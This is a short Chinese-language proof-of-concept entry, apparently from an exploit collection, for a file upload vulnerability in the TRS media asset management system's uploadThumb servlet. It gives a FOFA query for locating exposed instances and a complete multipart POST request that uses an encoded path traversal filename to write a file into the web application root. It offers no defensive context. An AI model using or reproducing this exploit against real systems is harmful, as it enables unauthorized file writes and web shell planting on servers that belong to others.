# 拓尔思TRS媒资管理系统uploadThumb存在文件上传漏洞



## fofa

```yaml
"TRS媒资管理系统"
```

## poc

```java
POST /mas/servlets/uploadThumb?appKey=sv&uploadingId=asd HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file";
filename="%2e%2e%2fwebapps%2fmas%2fa%2etxt"
Content-Type: application/octet-stream

1234
------WebKitFormBoundarySl8siBbmVicABvTX--
```

